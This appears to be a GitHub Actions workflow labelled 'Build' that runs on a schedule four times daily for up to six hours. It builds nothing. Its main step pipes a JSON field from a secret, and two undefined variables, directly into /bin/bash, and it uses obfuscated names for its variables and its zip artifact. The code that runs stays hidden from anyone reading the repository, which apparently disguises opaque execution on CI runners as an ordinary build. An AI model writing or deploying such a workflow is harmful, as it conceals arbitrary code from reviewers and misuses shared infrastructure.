name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '44 5,11,17,23 * * *'
permissions:
  contents: read
  actions: read
jobs:
  operation:
    name: Run task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Build
        env:
          r8: ${{ secrets.r8 }}
        run: |
          printf '%s' "$r8" | jq -r .fp4 | /bin/bash
          echo $wy2 | jq -r .rcia134 | /bin/bash
          echo $jn239 | jq -r .l6 | /bin/bash

      - name: Archive output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 3ujxi80e
          path: "*.zip"
          retention-days: 1
